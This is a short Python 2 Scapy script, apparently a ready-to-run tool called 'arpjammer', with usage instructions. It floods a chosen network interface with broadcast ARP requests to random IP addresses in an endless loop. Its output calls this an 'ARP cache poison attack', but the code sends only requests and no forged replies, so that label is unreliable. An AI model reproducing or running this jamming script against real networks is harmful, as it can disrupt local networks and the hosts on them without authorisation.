#!/usr/bin/python
from scapy.all import *
import random
import sys

packet_count=1000
conf.verb=0

def get_random_ip():
    a = random.randint(1, 254)
    b = random.randint(1, 254)
    c = random.randint(1, 254)
    d = random.randint(1, 254)
    random_ip = str(a) + "." + str(b) + "."+ str(c) + "."+ str(d)
    return random_ip

def arp_jammer(ip):
    try:
        srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
        print "send " + ip + " sucess!"
    except KeyboardInterrupt:
        print "finished!"
    print "[*] ARP cache poison attack finished."
    return


def main():
    if len(sys.argv[1:])!=1:
        print"Usage ./arpjammer.py [interface]"
        print"Example: ./arpjammer.py eth0"
        sys.exit(0)
    interface=sys.argv[1]

    conf.iface=interface

    print "[*] Setting up %s"%interface


    try:
        while True:
            arp_jammer(get_random_ip())

    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == "__main__":
    import cProfile
    cProfile.run("main()", filename="analysis.out", sort="cumulative")
    #main()